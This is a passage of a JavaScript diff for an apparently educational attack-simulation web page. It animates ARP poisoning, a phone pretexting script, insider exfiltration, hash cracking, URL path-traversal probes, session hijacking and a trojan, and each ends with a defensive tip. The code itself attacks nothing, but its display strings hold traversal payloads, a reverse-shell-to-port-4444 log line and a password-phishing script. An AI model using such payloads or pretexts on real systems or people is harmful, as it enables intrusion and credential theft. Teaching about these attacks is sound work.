+        arpPackets.forEach(pkt=>{
+            pkt.p+=0.03;
+            const px=pkt.x+(pkt.tx-pkt.x)*pkt.p, py=pkt.y+(pkt.ty-pkt.y)*pkt.p;
+            ctx.beginPath(); ctx.arc(px,py,4,0,Math.PI*2);
+            ctx.fillStyle=`rgba(255,59,59,${1-pkt.p})`; ctx.fill();
+            ctx.fillStyle=`rgba(255,59,59,${1-pkt.p*0.8})`;
+            ctx.font='7px monospace'; ctx.textAlign='center'; ctx.fillText('ARP',px,py-7);
+            if(pkt.p>=1)poisoned++;
+        });
+        arpPackets.splice(0,arpPackets.filter(p=>p.p>=1).length);
+
+        if(frame>100){
+            [0,1].forEach(idx=>{
+                const ty=h*0.53+idx*60;
+                ctx.fillStyle='rgba(255,59,59,0.05)'; ctx.strokeStyle='rgba(255,59,59,0.2)'; ctx.lineWidth=1;
+                ctx.beginPath(); ctx.roundRect(w*0.19,ty,185,48,4); ctx.fill(); ctx.stroke();
+                ctx.fillStyle='#ff3b3b'; ctx.font='bold 8px monospace'; ctx.textAlign='left';
+                ctx.fillText(`HOST ${idx===0?'A':'B'} ARP CACHE (POISONED):`,w*0.19+6,ty+12);
+                ctx.fillStyle='#8892a8'; ctx.font='8px monospace';
+                ctx.fillText('192.168.1.1 → DE:AD:BE:EF (ATTACKER)',w*0.19+6,ty+26);
+                ctx.fillStyle='#ff3b3b'; ctx.fillText('COMPROMISED!',w*0.19+6,ty+40);
+            });
+        }
+
+        if(frame===200){activateStep(3);termLog('> All victim traffic now routes via attacker!','error');}
+        if(frame===280){activateStep(4);termLog('> Packets modified and replayed to gateway.','error');}
+
+        if(frame%20===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=arpSent.toLocaleString();
+            if(e1)e1.textContent=Math.min(5,Math.floor(arpSent/10));
+            if(e2)e2.textContent=`${(poisoned*2.4).toFixed(1)} KB`;
+            if(e3)e3.textContent=`${Math.round(frame/60)}s`;
+            setProgress(Math.min(100,(frame/340)*100));
+        }
+        if(frame>=340){setProgress(100);termLog('> Simulation done. Use DAI on managed switches!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 11. SOCIAL ENGINEERING ────────────────────────────────────────────── */
+window.simulateSocialEngineering = function() {
+    termLog('> Profiling target via OSINT intelligence...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0, contacted=0, trusted=0, extracted=0;
+    const conversations=[
+        {speaker:'ATTACKER',msg:'Hi, this is Mike from IT security. We detected suspicious activity on your account.',delay:40},
+        {speaker:'VICTIM',msg:'Oh no, really? What kind of activity?',delay:100},
+        {speaker:'ATTACKER',msg:'Someone tried to access your account from Russia. We need to verify your identity.',delay:160},
+        {speaker:'VICTIM',msg:'Sure, how can I help?',delay:220},
+        {speaker:'ATTACKER',msg:'Could you please confirm your username and current password for verification?',delay:280},
+        {speaker:'VICTIM',msg:'It is jsmith / Summer@2024. Should I reset it?',delay:350},
+        {speaker:'ATTACKER',msg:'No no, we will handle it from our end. Thank you!',delay:410},
+        {speaker:'SYSTEM',msg:'CREDENTIALS EXFILTRATED: jsmith / Summer@2024',delay:440},
+    ];
+    const osintData=['john.smith@acmecorp.com (LinkedIn)','IT Manager @ ACME Corp (5 years)','(555) 867-5309 (company directory)','@jsmith_acme (Twitter)','Uses Summer passwords (OSINT)'];
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Pretext crafted: Fake IT security call.','warning');},700);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        const osintW=Math.min(200,w*0.3);
+        ctx.fillStyle='rgba(255,170,0,0.05)'; ctx.strokeStyle='rgba(255,170,0,0.15)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(8,8,osintW,120,6); ctx.fill(); ctx.stroke();
+        ctx.fillStyle='#ffaa00'; ctx.font='bold 9px monospace'; ctx.textAlign='left';
+        ctx.fillText('OSINT INTELLIGENCE',16,23);
+        osintData.slice(0,Math.min(5,Math.floor(frame/15)+1)).forEach((d,i)=>{
+            ctx.fillStyle='#8892a8'; ctx.font='8px monospace'; ctx.fillText(d,16,38+i*17);
+        });
+
+        const chatX=osintW+16, chatW=w-chatX-8;
+        ctx.fillStyle='rgba(255,255,255,0.02)'; ctx.strokeStyle='rgba(255,255,255,0.05)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(chatX,8,chatW,h-16,6); ctx.fill(); ctx.stroke();
+        ctx.fillStyle='#8892a8'; ctx.font='bold 9px monospace'; ctx.textAlign='center';
+        ctx.fillText('PHONE CALL TRANSCRIPT',chatX+chatW/2,23);
+
+        const visible=conversations.filter(c=>c.delay<=frame);
+        visible.forEach((conv,i)=>{
+            const cy=35+i*42; if(cy>h-20)return;
+            const isAtt=conv.speaker==='ATTACKER', isSys=conv.speaker==='SYSTEM';
+            const bx=isAtt?chatX+8:chatX+chatW*0.3, bw=chatW*0.65;
+            const nameColor=isSys?'#ff3b3b':isAtt?'#ffaa00':'#3b82f6';
+            ctx.fillStyle=isSys?'rgba(255,59,59,0.12)':isAtt?'rgba(255,170,0,0.08)':'rgba(59,130,246,0.08)';
+            ctx.strokeStyle=`${nameColor}50`; ctx.lineWidth=1;
+            ctx.beginPath(); ctx.roundRect(bx,cy,bw,34,5); ctx.fill(); ctx.stroke();
+            ctx.fillStyle=nameColor; ctx.font='bold 8px monospace'; ctx.textAlign='left';
+            ctx.fillText(conv.speaker,bx+7,cy+11);
+            ctx.fillStyle=isSys?'#ff3b3b':'#e8ecf4'; ctx.font='8px Arial';
+            ctx.fillText(conv.msg.length>65?conv.msg.slice(0,65)+'...':conv.msg,bx+7,cy+25);
+        });
+
+        if(frame===200){activateStep(2);contacted=5;termLog('> Target answering phone — guard lowering...','warning');}
+        if(frame===280){activateStep(3);trusted=4;termLog('> Victim TRUSTS the attacker — guard down.','warning');}
+        if(frame===360){activateStep(4);extracted=3;termLog('> CREDENTIALS EXTRACTED: jsmith / Summer@2024','error');}
+
+        if(frame%20===0){
+            const e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e1)e1.textContent=contacted;
+            if(e2)e2.textContent=trusted;
+            if(e3)e3.textContent=extracted;
+            setProgress(Math.min(100,(frame/470)*100));
+        }
+        if(frame>=470){setProgress(100);termLog('> Done. Train users — never share passwords!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 12. INSIDER THREAT ────────────────────────────────────────────────── */
+window.simulateInsiderThreat = function() {
+    termLog('> Monitoring privileged user activity...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0, filesEx=0, systemsAcc=0;
+    const fileList=['HR/employee_salaries.xlsx','LEGAL/acquisition_plans_CONFIDENTIAL.pdf','R&D/product_roadmap_2025.pptx','FINANCE/Q4_earnings_unreleased.xlsx','IT/admin_passwords.kdbx','CUSTOMER/pii_database.csv','IP/patent_applications.docx','SECURITY/network_topology.pdf'];
+    const exfilFiles=[];
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Insider escalating privileges via role access.','warning');},700);
+    simTimeout(()=>{if(!state.simRunning)return;systemsAcc=8;activateStep(2);termLog('> Accessing restricted repositories...','error');},1400);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        const nodes=[
+            {x:w*0.18,y:h*0.22,label:'HR Server',color:'#3b82f6',accessed:frame>60},
+            {x:w*0.38,y:h*0.12,label:'Finance DB',color:'#8b5cf6',accessed:frame>100},
+            {x:w*0.58,y:h*0.22,label:'R&D Repo',color:'#39ff14',accessed:frame>140},
+            {x:w*0.78,y:h*0.12,label:'Legal Docs',color:'#ffaa00',accessed:frame>180},
+            {x:w*0.5,y:h*0.44,label:'INSIDER',color:'#ff3b3b',evil:true},
+        ];
+
+        nodes.slice(0,4).forEach(node=>{
+            const c=node.accessed?'#ff3b3b':node.color;
+            ctx.beginPath(); ctx.moveTo(node.x,node.y); ctx.lineTo(nodes[4].x,nodes[4].y);
+            ctx.strokeStyle=node.accessed?'rgba(255,59,59,0.35)':'rgba(255,255,255,0.04)';
+            ctx.setLineDash(node.accessed?[4,4]:[]); ctx.lineWidth=1; ctx.stroke(); ctx.setLineDash([]);
+            ctx.shadowBlur=node.accessed?14:0; ctx.shadowColor='#ff3b3b';
+            ctx.beginPath(); ctx.arc(node.x,node.y,18,0,Math.PI*2);
+            ctx.fillStyle=`${c}18`; ctx.fill(); ctx.strokeStyle=c; ctx.lineWidth=2; ctx.stroke(); ctx.shadowBlur=0;
+            ctx.fillStyle=c; ctx.font='bold 8px monospace'; ctx.textAlign='center'; ctx.textBaseline='top';
+            ctx.fillText(node.label,node.x,node.y+20);
+            if(node.accessed)ctx.fillText('ACCESSED',node.x,node.y+31);
+        });
+
+        ctx.beginPath(); ctx.arc(nodes[4].x,nodes[4].y,20,0,Math.PI*2);
+        ctx.fillStyle='rgba(255,59,59,0.2)'; ctx.fill(); ctx.strokeStyle='#ff3b3b'; ctx.lineWidth=2; ctx.stroke();
+        ctx.fillStyle='#ff3b3b'; ctx.font='bold 8px monospace'; ctx.textAlign='center'; ctx.textBaseline='top';
+        ctx.fillText('INSIDER',nodes[4].x,nodes[4].y+22);
+
+        const exY=h*0.58;
+        ctx.fillStyle='rgba(255,59,59,0.04)'; ctx.strokeStyle='rgba(255,59,59,0.14)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(8,exY,w-16,h-exY-8,6); ctx.fill(); ctx.stroke();
+        ctx.fillStyle='#ff3b3b'; ctx.font='bold 9px monospace'; ctx.textAlign='left';
+        ctx.fillText('EXFILTRATION LOG — Files copied to USB drive:',16,exY+14);
+
+        if(frame%50===0&&exfilFiles.length<fileList.length&&frame>80){
+            exfilFiles.push(fileList[exfilFiles.length]);
+            filesEx=exfilFiles.length;
+            termLog(`> Exfiltrating: ${fileList[exfilFiles.length-1]}`,'error');
+            if(exfilFiles.length===4)activateStep(3);
+        }
+
+        exfilFiles.slice(-5).forEach((f,i)=>{
+            ctx.fillStyle='#8892a8'; ctx.font='8px monospace';
+            ctx.fillText(`${new Date().toLocaleTimeString()} | ${f} → USB_Drive_32GB`,16,exY+28+i*16);
+        });
+
+        if(frame===350){activateStep(4);termLog('> Audit logs DELETED. Cover tracks complete.','error');}
+
+        if(frame%20===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=Math.min(30,systemsAcc+Math.floor(frame/40));
+            if(e1)e1.textContent=filesEx;
+            if(e2)e2.textContent=`${(filesEx*8.2).toFixed(1)} MB`;
+            if(e3)e3.textContent=frame > 300 ? 'Escalated' : '77 days';
+            setProgress(Math.min(100,(frame/420)*100));
+        }
+        if(frame>=420){setProgress(100);termLog('> Simulation done. Implement UEBA & DLP!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ══════════════════════════════════════════════════════════════════════════
+   ADDITIONAL ATTACK SIMULATION FUNCTIONS (13 new attacks)
+   ══════════════════════════════════════════════════════════════════════════ */
+
+/* ─── 13. PASSWORD ATTACK ───────────────────────────────────────────────── */
+window.simulatePasswordAttack = function() {
+    termLog('> Loading leaked credential database from dark web...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0, hashesAnalyzed=0, cracked=0, sitesTested=0, accountsTaken=0;
+    const hashTypes=['MD5','SHA-1','SHA-256','bcrypt','NTLM','LM'];
+    const passwords=['123456','password','qwerty','letmein','admin123','Summer2024!','Welcome1','Pass@123'];
+    const hashes=passwords.map(p=>({pwd:p,hash:btoa(p).substring(0,22)+'==',type:hashTypes[Math.floor(Math.random()*hashTypes.length)],cracked:false,progress:0}));
+    const sites=['Gmail','LinkedIn','Twitter','GitHub','Banking','Slack','AWS Console','VPN Portal'];
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> 4.7 million hashes loaded. Analyzing hash types...','warning');},600);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Rainbow table lookup initiated...','error');},1400);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        const bW=Math.min(580,w-20), bX=(w-bW)/2;
+        // Header
+        ctx.fillStyle='#ffaa00'; ctx.font='bold 12px monospace'; ctx.textAlign='center';
+        ctx.fillText('PASSWORD HASH CRACKING — RAINBOW TABLE',w/2,22);
+
+        // Hash table display
+        hashes.forEach((entry,i)=>{
+            const hy=40+i*42;
+            if(hy>h-60)return;
+            // Progress animation
+            if(frame>40+i*25&&!entry.cracked){
+                entry.progress=Math.min(1,entry.progress+0.025);
+                if(entry.progress>=1){entry.cracked=true;cracked++;activateStep(3);}
+            }
+            hashesAnalyzed=Math.min(hashes.length,Math.floor(frame/30));
+
+            const isWeak=['MD5','SHA-1','NTLM','LM'].includes(entry.type);
+            ctx.fillStyle=entry.cracked?'rgba(255,59,59,0.12)':entry.progress>0?'rgba(255,170,0,0.08)':'rgba(255,255,255,0.02)';
+            ctx.strokeStyle=entry.cracked?'rgba(255,59,59,0.35)':isWeak?'rgba(255,170,0,0.25)':'rgba(57,255,20,0.2)';
+            ctx.lineWidth=1; ctx.beginPath(); ctx.roundRect(bX,hy,bW,34,4); ctx.fill(); ctx.stroke();
+
+            // Progress fill
+            if(entry.progress>0&&!entry.cracked){
+                ctx.fillStyle='rgba(255,170,0,0.25)';
+                ctx.beginPath(); ctx.roundRect(bX,hy,bW*entry.progress,34,4); ctx.fill();
+            }
+
+            ctx.fillStyle=entry.cracked?'#ff3b3b':isWeak?'#ffaa00':'#39ff14';
+            ctx.font='bold 9px monospace'; ctx.textAlign='left';
+            ctx.fillText(`${entry.type} ${isWeak?'(WEAK)':'(STRONG)'}`,bX+8,hy+13);
+            ctx.fillStyle='#525c70'; ctx.font='9px monospace';
+            ctx.fillText(entry.hash,bX+95,hy+13);
+            if(entry.cracked){
+                ctx.fillStyle='#ff3b3b'; ctx.font='bold 9px monospace'; ctx.textAlign='right';
+                ctx.fillText(`CRACKED: ${entry.pwd}`,bX+bW-8,hy+13);
+            }
+
+            // Mini progress bar
+            ctx.fillStyle='rgba(255,255,255,0.05)'; ctx.fillRect(bX+8,hy+20,bW-16,6);
+            const barGrad=ctx.createLinearGradient(bX+8,0,bX+bW-8,0);
+            barGrad.addColorStop(0,'#ffaa00'); barGrad.addColorStop(1,entry.cracked?'#ff3b3b':'#39ff14');
+            ctx.fillStyle=barGrad;
+            ctx.fillRect(bX+8,hy+20,(bW-16)*entry.progress,6);
+            ctx.textAlign='left';
+        });
+
+        // Credential stuffing phase
+        if(cracked>3&&frame%40===0&&sitesTested<sites.length){
+            sitesTested++;
+            if(Math.random()>0.5){accountsTaken++;activateStep(4);termLog(`> Account takeover: ${sites[sitesTested-1]} — credentials matched!`,'error');}
+            else termLog(`> Testing ${sites[sitesTested-1]}... FAILED`,'warning');
+        }
+
+        if(frame%15===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=(hashesAnalyzed*580000).toLocaleString();
+            if(e1)e1.textContent=cracked;
+            if(e2)e2.textContent=sitesTested;
+            if(e3)e3.textContent=accountsTaken;
+            setProgress(Math.min(100,(frame/380)*100));
+        }
+        if(frame>=380){setProgress(100);termLog('> Simulation done. Use bcrypt + MFA!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 14. URL INTERPRETATION ────────────────────────────────────────────── */
+window.simulateURLInterpretation = function() {
+    termLog('> Probing web application URL structure...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0, urlsProbed=0, pathsTraversed=0, filesAccessed=0, authBypasses=0;
+    const urlTests=[
+        {url:'https://shop.example.com/../../etc/passwd',type:'PATH TRAVERSAL',result:'root:x:0:0:root:/root:/bin/bash',severity:'critical',delay:30},
+        {url:'https://app.example.com/user?id=1&role=admin',type:'PARAM TAMPERING',result:'Admin panel unlocked',severity:'high',delay:80},
+        {url:'https://site.com/admin/../admin/config.php',type:'FORCED BROWSE',result:'DB_PASS=s3cr3t exposed',severity:'critical',delay:130},
+        {url:'https://api.example.com/../../../windows/system32/drivers/etc/hosts',type:'WIN TRAVERSAL',result:'127.0.0.1 localhost',severity:'high',delay:180},
+        {url:'https://corp.com/backup.zip',type:'FORCED BROWSE',result:'Full source code archive',severity:'critical',delay:230},
+        {url:'https://login.com/reset?user=admin&token=',type:'PARAM INJECTION',result:'Password reset bypassed',severity:'critical',delay:280},
+    ];
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> ../../../etc/passwd — traversal payload injected!','error');},600);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Parameter manipulation: ?user_id=1 → ADMIN','error');},1200);
+
+    let revealed=[];
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        ctx.fillStyle='#3b82f6'; ctx.font='bold 11px monospace'; ctx.textAlign='center';
+        ctx.fillText('URL MANIPULATION ATTACKS — PROBE RESULTS',w/2,22);
+
+        // Reveal tests progressively
+        urlTests.forEach(test=>{
+            if(frame>=test.delay&&!revealed.includes(test.url)){
+                revealed.push(test.url);
+                urlsProbed++;
+                if(test.type.includes('TRAVERSAL'))pathsTraversed++;
+                if(test.severity==='critical'){filesAccessed++;authBypasses++;}
+                termLog(`> ${test.type}: ${test.result}`,'error');
+                if(revealed.length===2)activateStep(2);
+                if(revealed.length===4)activateStep(3);
+                if(revealed.length===6)activateStep(4);
+            }
+        });
+
+        const bW=Math.min(580,w-20), bX=(w-bW)/2;
+        revealed.forEach((url,i)=>{
+            const test=urlTests.find(t=>t.url===url);
+            if(!test)return;
+            const ry=40+i*52; if(ry>h-20)return;
+            const isCrit=test.severity==='critical';
+            ctx.fillStyle=isCrit?'rgba(255,59,59,0.1)':'rgba(255,170,0,0.08)';
+            ctx.strokeStyle=isCrit?'rgba(255,59,59,0.35)':'rgba(255,170,0,0.3)';
+            ctx.lineWidth=1; ctx.beginPath(); ctx.roundRect(bX,ry,bW,44,5); ctx.fill(); ctx.stroke();
+
+            ctx.fillStyle=isCrit?'#ff3b3b':'#ffaa00'; ctx.font='bold 8px monospace'; ctx.textAlign='left';
+            ctx.fillText(`[${test.type}]`,bX+8,ry+13);
+            ctx.fillStyle='#3b82f6'; ctx.font='8px monospace';
+            const shortUrl=test.url.length>65?test.url.slice(0,62)+'...':test.url;
+            ctx.fillText(shortUrl,bX+8,ry+25);
+            ctx.fillStyle=isCrit?'#ff3b3b':'#ffaa00'; ctx.font='bold 8px monospace';
+            ctx.fillText(`RESULT: ${test.result}`,bX+8,ry+38);
+        });
+
+        if(frame%20===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=urlsProbed*25;
+            if(e1)e1.textContent=pathsTraversed;
+            if(e2)e2.textContent=filesAccessed;
+            if(e3)e3.textContent=authBypasses;
+            setProgress(Math.min(100,(frame/360)*100));
+        }
+        if(frame>=360){setProgress(100);termLog('> Simulation done. Validate all URL inputs!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 15. SESSION HIJACKING ─────────────────────────────────────────────── */
+window.simulateSessionHijack = function() {
+    termLog('> Scanning network for active session tokens...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0, sessionsMonitored=0, tokensCaptured=0, replaysAttempted=0, hijacksSuccessful=0;
+    const sessions=[
+        {id:'sess_eyJhbGci...Xk9mT2w',user:'alice@corp.com',site:'CRM System',x:0,y:0,captured:false,progress:0},
+        {id:'PHPSESSID=a3f7c9b2...e4d1',user:'bob@corp.com',site:'Admin Panel',x:0,y:0,captured:false,progress:0},
+        {id:'auth=Bearer eyJzdWIi...7f2',user:'carol@corp.com',site:'Bank Portal',x:0,y:0,captured:false,progress:0},
+        {id:'token=d8f3a1b7...9e5c',user:'dave@corp.com',site:'Email (IMAP)',x:0,y:0,captured:false,progress:0},
+    ];
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Session token captured from HTTP traffic.','error');},700);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Replaying stolen token in attacker browser...','error');},1500);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        ctx.fillStyle='#8b5cf6'; ctx.font='bold 12px monospace'; ctx.textAlign='center';
+        ctx.fillText('SESSION HIJACKING — TOKEN THEFT & REPLAY',w/2,22);
+
+        const bW=Math.min(580,w-20), bX=(w-bW)/2;
+        sessionsMonitored=Math.min(sessions.length,Math.ceil(frame/30));
+
+        sessions.slice(0,sessionsMonitored).forEach((sess,i)=>{
+            const sy=40+i*72;
+            if(frame>60+i*45&&!sess.captured){
+                sess.progress=Math.min(1,sess.progress+0.02);
+                if(sess.progress>=1){sess.captured=true;tokensCaptured++;replaysAttempted++;hijacksSuccessful++;activateStep(3);termLog(`> Hijacked: ${sess.user} on ${sess.site}!`,'error');}
+            }
+            ctx.fillStyle=sess.captured?'rgba(139,92,246,0.15)':'rgba(255,255,255,0.02)';
+            ctx.strokeStyle=sess.captured?'rgba(139,92,246,0.5)':'rgba(255,255,255,0.06)';
+            ctx.lineWidth=1; ctx.beginPath(); ctx.roundRect(bX,sy,bW,60,6); ctx.fill(); ctx.stroke();
+
+            // Token flow animation
+            if(sess.progress>0&&!sess.captured){
+                ctx.fillStyle='rgba(139,92,246,0.2)'; ctx.beginPath(); ctx.roundRect(bX,sy,bW*sess.progress,60,6); ctx.fill();
+            }
+
+            ctx.fillStyle='#8892a8'; ctx.font='bold 9px monospace'; ctx.textAlign='left';
+            ctx.fillText(`USER: ${sess.user}  |  TARGET: ${sess.site}`,bX+10,sy+14);
+            ctx.fillStyle='#525c70'; ctx.font='8px monospace';
+            ctx.fillText(sess.id,bX+10,sy+27);
+
+            if(sess.captured){
+                ctx.fillStyle='rgba(139,92,246,0.3)'; ctx.beginPath(); ctx.roundRect(bX+10,sy+36,bW-20,18,4); ctx.fill();
+                ctx.fillStyle='#8b5cf6'; ctx.font='bold 9px monospace'; ctx.textAlign='center';
+                ctx.fillText('SESSION HIJACKED — Attacker logged in as '+sess.user.split('@')[0],bX+bW/2,sy+48);
+                if(i===0&&frame>sess.progress*50+100)activateStep(4);
+            } else {
+                const dots='.'+'..'.repeat(Math.floor(frame/10)%3+1);
+                ctx.fillStyle='#ffaa00'; ctx.font='9px monospace'; ctx.textAlign='left';
+                ctx.fillText(`Intercepting${dots}`,bX+10,sy+48);
+            }
+        });
+
+        if(frame%15===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=sessionsMonitored*1200;
+            if(e1)e1.textContent=tokensCaptured;
+            if(e2)e2.textContent=replaysAttempted;
+            if(e3)e3.textContent=hijacksSuccessful;
+            setProgress(Math.min(100,(frame/350)*100));
+        }
+        if(frame>=350){setProgress(100);termLog('> Simulation done. Regenerate tokens on login!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 16. TROJAN HORSE ──────────────────────────────────────────────────── */
+window.simulateTrojan = function() {
+    termLog('> Trojan packaged as fake game installer...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0, c2Connections=0, filesStolen=0, keystrokesLogged=0, payloadDownloads=0;
+    const c2Packets=[];
+    const stealItems=['Documents/passwords.txt','Desktop/bank_login.docx','Pictures/id_scan.jpg','AppData/Chrome/Cookies','Saved Passwords (Chrome)','SSH Keys (~/.ssh/id_rsa)'];
+    let stolenItems=[];
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> User executed: Game_Crack_v2.3.exe','error');},600);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Backdoor opened: reverse shell to 45.33.xx.xx:4444','error');},1400);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(3);termLog('> Keylogger hook installed (SetWindowsHookEx)','error');},2200);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        // Two panels: victim (left), attacker C2 (right)
+        const midX=w/2-10;
+
+        // Victim side
+        ctx.fillStyle='rgba(255,255,255,0.02)'; ctx.strokeStyle='rgba(255,255,255,0.05)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(8,10,midX-8,h-20,6); ctx.fill(); ctx.stroke();
+        ctx.fillStyle='#3b82f6'; ctx.font='bold 10px monospace'; ctx.textAlign='center';
+        ctx.fillText('VICTIM MACHINE',midX/2,26);
+
+        // Fake game window
+        if(frame<40){
+            ctx.fillStyle='rgba(30,40,60,0.9)'; ctx.beginPath(); ctx.roundRect(20,40,midX-28,100,6); ctx.fill();
+            ctx.fillStyle='#e8ecf4'; ctx.font='bold 12px monospace'; ctx.textAlign='center';
+            ctx.fillText('Game_Crack_v2.3.exe',midX/2,65);
+            ctx.fillStyle='#8892a8'; ctx.font='9px monospace';
+            ctx.fillText('Installing... Please wait',midX/2,90);
+            ctx.fillStyle='rgba(57,255,20,0.8)'; ctx.fillRect(30,105,Math.min((midX-48)*(frame/40),midX-48),10);
+        } else {
+            ctx.fillStyle='rgba(255,59,59,0.08)'; ctx.beginPath(); ctx.roundRect(20,40,midX-28,100,6); ctx.fill();
+            ctx.fillStyle='#ff3b3b'; ctx.font='bold 10px monospace'; ctx.textAlign='center';
+            ctx.fillText('TROJAN ACTIVE IN BACKGROUND',midX/2,65);
+            ctx.fillStyle='#8892a8'; ctx.font='8px monospace';
+            ctx.fillText(`Processes: svhost32.exe (hidden)`,midX/2,82);
+            ctx.fillText(`Port: 4444 OPEN (reverse shell)`,midX/2,96);
+            ctx.fillText(`Hook: WH_KEYBOARD_LL (active)`,midX/2,110);
+        }
+
+        // Stolen files list
+        if(stolenItems.length>0){
+            ctx.fillStyle='#8892a8'; ctx.font='bold 8px monospace'; ctx.textAlign='left';
+            ctx.fillText('EXFILTRATING:',20,165);
+            stolenItems.slice(-5).forEach((item,i)=>{
+                ctx.fillStyle=`rgba(255,59,59,${0.9-i*0.1})`; ctx.font='8px monospace';
+                ctx.fillText(`📤 ${item}`,20,180+i*16);
+            });
+        }
+
+        // Keylogger simulation
+        if(frame>100){
+            const kY=h-80;
+            ctx.fillStyle='rgba(255,0,170,0.05)'; ctx.strokeStyle='rgba(255,0,170,0.2)'; ctx.lineWidth=1;
+            ctx.beginPath(); ctx.roundRect(8,kY,midX-8,65,4); ctx.fill(); ctx.stroke();
+            ctx.fillStyle='#ff00aa'; ctx.font='bold 8px monospace'; ctx.textAlign='left';
+            ctx.fillText('KEYLOG:',16,kY+14);
+            const sample='password123 [ENTER] admin [TAB] MyBank2024! [ENTER]';
+            ctx.fillStyle='#8892a8'; ctx.font='8px monospace';
+            ctx.fillText(sample.slice(0,Math.min(sample.length,Math.floor((frame-100)/2))),16,kY+30);
+            keystrokesLogged=Math.min(480,frame*2);
+        }
+
+        // Attacker C2 side
+        ctx.fillStyle='rgba(255,59,59,0.03)'; ctx.strokeStyle='rgba(255,59,59,0.12)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(midX+8,10,w-midX-18,h-20,6); ctx.fill(); ctx.stroke();
+        ctx.fillStyle='#ff3b3b'; ctx.font='bold 10px monospace'; ctx.textAlign='center';
+        ctx.fillText('ATTACKER C2',midX+8+(w-midX-18)/2,26);
+
+        c2Connections=Math.min(50,Math.floor(frame/8));
+        ctx.fillStyle='#ff3b3b'; ctx.font='bold 22px monospace'; ctx.textAlign='center';
+        ctx.fillText(c2Connections,midX+8+(w-midX-18)/2,h/2-20);
+        ctx.fillStyle='#8892a8'; ctx.font='9px monospace';
+        ctx.fillText('Active C2 Connections',midX+8+(w-midX-18)/2,h/2+5);
+        ctx.fillText(`${filesStolen} files stolen`,midX+8+(w-midX-18)/2,h/2+20);
+        ctx.fillText(`${payloadDownloads} payloads delivered`,midX+8+(w-midX-18)/2,h/2+35);
+
+        // C2 beacon packets
+        if(frame%20===0&&frame>40){
+            c2Packets.push({x:midX-10,y:h/2,tx:midX+20,ty:h/2,p:0});
+        }
+        c2Packets.forEach(pkt=>{
+            pkt.p+=0.05;
